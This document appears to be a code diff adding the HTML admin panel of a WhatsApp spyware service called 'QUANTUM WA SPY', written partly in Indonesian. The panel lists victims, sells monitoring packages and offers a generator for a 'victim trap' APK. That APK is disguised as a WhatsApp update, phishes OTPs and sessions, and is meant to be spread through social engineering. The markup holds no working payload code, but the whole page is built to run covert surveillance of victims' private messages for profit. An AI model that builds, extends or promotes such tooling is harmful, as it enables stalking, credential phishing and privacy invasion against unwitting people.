@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>QUANTUM WA SPY Ω v2.1 - Admin Panel</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="container" id="loginPage">
+    <div class="login-card glow">
+      <h1>QUANTUM_Ω <span class="neon">WA SPY</span> v2.1</h1>
+      <p class="subtitle">Remote Access • End-to-End Bypass • Ω Protocol</p>
+      
+      <form id="loginForm">
+        <div class="input-group">
+          <i class="fas fa-user-secret"></i>
+          <input type="text" id="username" placeholder="Admin ID / Email" required/>
+        </div>
+        <div class="input-group">
+          <i class="fas fa-key"></i>
+          <input type="password" id="password" placeholder="Master Ω Key" required/>
+        </div>
+        <button type="submit" class="btn neon-btn">ACTIVATE QUANTUM ACCESS 🔥</button>
+      </form>
+      
+      <div class="extra-links">
+        <a href="#">Recover Key</a> • <a href="#">Create New Admin</a> • <a href="#">Dark Web Mirror</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="container hidden" id="dashboard">
+    <header>
+      <div class="logo">QUANTUM_Ω <span>WA SPY PANEL v2.1</span></div>
+      <div class="user-info">
+        <span>Logged in as: <strong id="adminName">...</strong></span>
+        <button class="btn logout-btn" id="logout">DISCONNECT Ω</button>
+      </div>
+    </header>
+
+    <main>
+      <section class="stats-grid">
+        <div class="stat-card glow">
+          <i class="fas fa-user-secret"></i>
+          <h3>Active Victims</h3>
+          <p id="activeTargets">0</p>
+        </div>
+        <div class="stat-card glow">
+          <i class="fas fa-wallet"></i>
+          <h3>Total Earnings</h3>
+          <p id="totalRevenue">Rp 0</p>
+        </div>
+        <div class="stat-card glow">
+          <i class="fas fa-bolt"></i>
+          <h3>Live Targets</h3>
+          <p id="onlineNow">0</p>
+        </div>
+        <div class="stat-card glow">
+          <i class="fas fa-shield-virus"></i>
+          <h3>Anti-Detection</h3>
+          <p>99.8%</p>
+        </div>
+      </section>
+
+      <section class="tabs">
+        <button class="tab active" data-tab="victims">Victim List</button>
+        <button class="tab" data-tab="packages">Pricing Ω</button>
+        <button class="tab" data-tab="live">Live Monitor</button>
+        <button class="tab" data-tab="apk">APK Generator</button>
+        <button class="tab" data-tab="logs">Access Logs</button>
+      </section>
+
+      <!-- Victim List Tab -->
+      <div class="tab-content active" id="victimsTab">
+        <div class="action-bar">
+          <input type="text" id="searchVictim" placeholder="Search nomor WA / nama..."/>
+          <button class="btn neon-btn"><i class="fas fa-plus"></i> Tambah Victim Manual</button>
+        </div>
+        <table id="victimTable">
+          <thead>
+            <tr>
+              <th>Nomor WA</th>
+              <th>Status</th>
+              <th>Paket</th>
+              <th>Expired</th>
+              <th>Last Sync</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+
+      <!-- Packages Tab -->
+      <div class="tab-content" id="packagesTab">
+        <h2>Paket Kontrol Ω 2026</h2>
+        <div class="packages-grid">
+          <div class="package-card">
+            <h3>Harian Flash</h3>
+            <div class="price">Rp 35.000</div>
+            <ul>
+              <li>24 jam full access</li>
+              <li>Chat + Status + Media</li>
+              <li>Live typing indicator</li>
+            </ul>
+            <button class="btn">Buy / Activate</button>
+          </div>
+          <div class="package-card popular">
+            <h3>Bulanan Pro</h3>
+            <div class="price">Rp 199.000</div>
+            <ul>
+              <li>30 hari unlimited</li>
+              <li>Auto reconnect</li>
+              <li>Priority server</li>
+              <li>Anti-deteksi tinggi</li>
+            </ul>
+            <button class="btn">Buy / Activate</button>
+          </div>
+          <div class="package-card">
+            <h3>Tahunan Elite</h3>
+            <div class="price">Rp 1.499.000</div>
+            <ul>
+              <li>365 hari full power</li>
+              <li>Custom branding APK</li>
+              <li>Multi-device support</li>
+              <li>Lifetime update</li>
+            </ul>
+            <button class="btn">Buy / Activate</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live Monitor Tab -->
+      <div class="tab-content" id="liveTab">
+        <h2>Real-Time Victim Monitor</h2>
+        <div id="liveFeeds"></div>
+      </div>
+
+      <!-- APK Generator Tab -->
+      <div class="tab-content" id="apkTab">
+        <h2>Generate Dual APK System</h2>
+        
+        <div class="apk-types">
+          <div class="apk-type-card victim-apk">
+            <h3>APK Korban (Victim Trap)</h3>
+            <p class="desc">Disguised as WhatsApp Update / Premium / GBWhatsApp</p>
+            <ul>
+              <li>Ikon resmi / custom</li>
+              <li>Splash "Sedang Update..."</li>
+              <li>Phishing OTP / QR / Session</li>
+              <li>Background persistence</li>
+            </ul>
+            <form class="apk-form" id="victimApkForm">
+              <div class="input-group">
+                <label>Nomor WA Target</label>
+                <input type="text" id="victimNumber" placeholder="628xxxxxxxxxx" required/>
+              </div>
+              <div class="input-group">
+                <label>Pilih Paket</label>
+                <select id="victimPackage" required>
+                  <option>Harian Flash</option>
+                  <option>Bulanan Pro</option>
+                  <option>Tahunan Elite</option>
+                </select>
+              </div>
+              <button type="submit" class="btn neon-btn large">GENERATE VICTIM APK 🔥</button>
+            </form>
+          </div>
+
+          <div class="apk-type-card admin-apk">
+            <h3>APK Pengguna (Admin Controller)</h3>
+            <p class="desc">Aplikasi monitor di HP Admin / PC Emulator</p>
+            <ul>
+              <li>Mini dashboard target</li>
+              <li>Live chat & media viewer</li>
+              <li>Push notification</li>
+              <li>Export data</li>
+            </ul>
+            <form class="apk-form" id="adminApkForm">
+              <div class="input-group">
+                <label>Admin Username</label>
+                <input type="text" value="admin" disabled/>
+              </div>
+              <button type="submit" class="btn neon-btn large admin-btn">GENERATE CONTROLLER APK Ω</button>
+            </form>
+          </div>
+        </div>
+
+        <p class="note neon-note">APK Victim → kirim via WA / Telegram (social engineering).<br>APK Controller → install di HP Admin untuk akses panel mini.</p>
+      </div>
+
+      <!-- Logs Tab (fake) -->
+      <div class="tab-content" id="logsTab">
+        <h2>Access & Activity Logs</h2>
+        <table id="logsTable">
+          <thead>
+            <tr>
+              <th>Waktu</th>
+              <th>Target</th>
+              <th>Activity</th>
+              <th>IP / Device</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td>2026-03-16 19:45 WIB</td><td>6281234567890</td><td>Chat read + media download</td><td>36.72.1xx.xx (Jakarta)</td></tr>
+            <tr><td>2026-03-16 19:32 WIB</td><td>6289876543210</td><td>Online status update</td><td>114.5.xx.xx (Bandung)</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
